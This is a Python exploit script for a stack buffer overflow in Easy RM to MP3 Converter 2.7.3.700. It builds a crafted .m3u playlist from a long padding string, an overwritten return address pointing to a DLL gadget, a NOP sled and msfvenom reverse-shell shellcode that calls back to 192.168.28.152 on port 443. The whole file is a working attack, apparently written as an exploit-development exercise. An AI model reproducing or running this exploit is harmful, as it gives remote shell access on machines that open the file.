#!/usr/bin/env python 

# Easy RM to MP3 Converter 2.7.3.700 Buffer Overflow
 
file     = "crash.m3u"
junk     = "\x41"*35027
eip      = "\x58\xb0\x01\x10" #0x1001b058 : push esp # ret  |  {PAGE_EXECUTE_READ} [MSRMfilter03.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files (x86)\Easy RM to MP3 Converter\MSRMfilter03.dll)
preshell = "FUCK"

# msfvenom -p windows/shell_reverse_tcp -f python LHOST=192.168.28.152 LPORT=443 -b "\x00\x09\x0a" --smallest -v shellcode

shellcode = "\x90"*100
shellcode += "\xcc" # break
shellcode +=  b""
shellcode += b"\x33\xc9\x66\xb9\x43\x01\xe8\xff\xff\xff\xff"
shellcode += b"\xc1\x5e\x30\x4c\x0e\x07\xe2\xfa\xfd\xea\x81"
shellcode += b"\x04\x05\x06\x67\x81\xec\x3b\xcb\x68\x86\x5e"
shellcode += b"\x3f\x9b\x43\x1e\x98\x46\x01\x9d\x65\x30\x16"
shellcode += b"\xad\x51\x3a\x2c\xe1\xb3\x1c\x40\x5e\x21\x08"
shellcode += b"\x05\xe7\xe8\x25\x28\xed\xc9\xde\x7f\x79\xa4"
shellcode += b"\x62\x21\xb9\x79\x08\xbe\x7a\x26\x40\xda\x72"
shellcode += b"\x3a\xed\x6c\xb5\x66\x60\x40\x91\xc8\x0d\x5d"
shellcode += b"\xa5\x7d\x01\xc2\x7e\xc0\x4d\x9b\x7f\xb0\xfc"
shellcode += b"\x90\x9d\x5e\x55\x92\x6e\xb7\x2d\xaf\x59\x26"
shellcode += b"\xa4\x66\x23\x7b\x15\x85\x3a\xe8\x3c\x41\x67"
shellcode += b"\xb4\x0e\xe2\x66\x20\xe7\x35\x72\x6e\xa3\xfa"
shellcode += b"\x76\xf8\x75\xa5\xff\x33\x5c\x5d\x21\x20\x1d"
shellcode += b"\x24\x24\x2e\x7f\x61\xdd\xdc\xde\x0e\x94\x6c"
shellcode += b"\x05\xd4\xe2\xb8\xbe\x8d\x8e\xe7\xe7\xe2\xa0"
shellcode += b"\xcc\xc0\xfd\xda\xe0\xbe\x9e\x65\x4e\x24\x0d"
shellcode += b"\x9f\x9f\xa0\x88\x66\xf7\xf4\xcd\x8f\x27\xc3"
shellcode += b"\xa9\x55\x7e\xfc\xfd\xfe\xff\xf0\xe1\xf2\xe3"
shellcode += b"\xdc\x5f\xb9\x68\x58\x46\x6f\x2c\xd6\xb8\xd6"
shellcode += b"\x7f\x68\xdd\x5a\xab\xc6\xc5\xc7\x7c\x41\x2f"
shellcode += b"\xa0\xdb\x9a\x9a\xa6\x56\x75\xa5\xb3\x2c\x01"
shellcode += b"\x50\x16\xa3\xd4\x26\x94\xd3\xa9\x31\xb6\x2f"
shellcode += b"\x55\x43\xb4\x1c\x31\x8d\x85\x8a\x8c\xe9\x63"
shellcode += b"\x08\xbb\xba\xb9\xde\x06\x9b\xe0\xaa\xa2\x17"
shellcode += b"\x0b\x91\x3f\xbd\xde\xc7\xfd\xfc\x73\xbb\x24"
shellcode += b"\x11\xc4\x03\x40\x51\x56\x51\x5e\x5f\x4c\x5d"
shellcode += b"\x42\x5b\x58\x5c\x46\x79\x6b\xdf\x2b\x93\xe9"
shellcode += b"\xc2\x91\xf9\x54\x4d\x5a\xe2\x2e\x77\x28\xa6"
shellcode += b"\x3f\x43\xdb\xf0\x9d\xd7\x9d\x8b\x7c\x43\x8a"
shellcode += b"\xb8\x93\xb2\xcf\xe4\x0e\x35\x48\x3f\xb6\xcc"
shellcode += b"\xd8\x4c\x3f\x80\x7b\x2e\x4c\x50\x2a\x41\x11"
shellcode += b"\xbc\x91"
 
evil_buffer = junk + eip + preshell + shellcode 
 
fd = open(file, 'w')
fd.write(evil_buffer)
fd.close()
